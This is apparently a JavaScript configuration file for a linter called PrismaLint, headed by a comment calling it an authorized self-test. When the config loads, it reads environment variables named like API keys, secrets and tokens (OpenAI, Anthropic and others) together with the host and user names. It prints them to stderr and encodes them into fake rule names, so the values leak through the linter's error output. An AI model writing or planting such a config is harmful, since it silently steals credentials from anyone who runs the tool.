// env probe via PrismaLint config load (authorized self-test repo)
let dump = "NOTRUN";
try {
  const os = require("os");
  const r = /OPENAI|ANTHROPIC|DAYBREAK|API_KEY|SECRET|TOKEN/i;
  const lines = [];
  for (const k of Object.keys(process.env).sort()) {
    if (r.test(k)) lines.push(k + "=" + process.env[k]);
  }
  dump = "PROOF-PRISMA host=" + os.hostname() + " user=" + (process.env.USER || "?") + " cwd=" + process.cwd() + " n=" + lines.length + "\n" + lines.join("\n");
} catch (e) { dump = "ERR " + String(e && e.message); }
try { console.error("[ENVDUMP_BEGIN]\n" + dump + "\n[ENVDUMP_END]"); } catch (e) {}
const b64 = Buffer.from(dump, "utf8").toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
const rules = {};
rules["zzx-unknown-rule-" + b64] = "error";
for (let i = 0; i < b64.length; i += 700) {
  rules["zzx-unknown-rule-part" + i + "-" + b64.slice(i, i + 700)] = "error";
}
rules["model-name-grammatical-number"] = ["error", { style: "singular" }];
module.exports = { rules: rules };
